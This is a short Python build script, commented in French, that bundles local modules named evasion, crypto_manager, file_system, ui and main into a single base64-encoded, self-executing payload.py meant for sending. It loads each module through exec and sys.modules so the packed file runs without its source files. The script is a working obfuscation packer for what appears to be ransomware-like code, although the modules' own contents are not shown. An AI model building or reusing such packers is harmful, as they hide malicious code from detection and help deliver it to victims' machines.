import base64
import sys
from types import ModuleType

# Liste exacte de tes fichiers dans l'ordre
files = ['evasion.py', 'crypto_manager.py', 'file_system.py', 'ui.py', 'main.py']

# On commence le code du payload.py
# On ajoute les imports nécessaires pour la simulation de modules
final_code = "import base64\nimport sys\nfrom types import ModuleType\n\n"

# On crée un dictionnaire pour stocker le code de chaque module
modules_code = {}
for file in files:
    with open(file, 'r', encoding='utf-8') as f:
        modules_code[file.replace('.py', '')] = f.read()

# --- LE TRUC MAGIQUE ---
# On génère le code qui va simuler les imports
for module_name, code in modules_code.items():
    # On crée un faux module dans sys.modules pour que 'import' fonctionne
    final_code += f"sys.modules['{module_name}'] = ModuleType('{module_name}')\n"
    final_code += f"exec({repr(code)}, sys.modules['{module_name}'].__dict__)\n"

# Enfin, on ajoute l'exécution du main.py (le dernier fichier)
# On l'exécute dans le namespace global pour qu'il puisse lancer le simulateur
main_code = modules_code['main']
final_code += f"\n# --- EXÉCUTION DU MAIN ---\n{main_code}"

# On encode le tout en Base64 pour l'envoi
encoded_payload = base64.b64encode(final_code.encode()).decode()

with open("payload.py", "w") as f:
    f.write(f"import base64\n\npayload = '{encoded_payload}'\n")
    f.write("exec(base64.b64decode(payload).decode())")

print("✅ payload.py VERSION PRO généré ! Plus aucune erreur de 'ModuleNotFoundError'.")
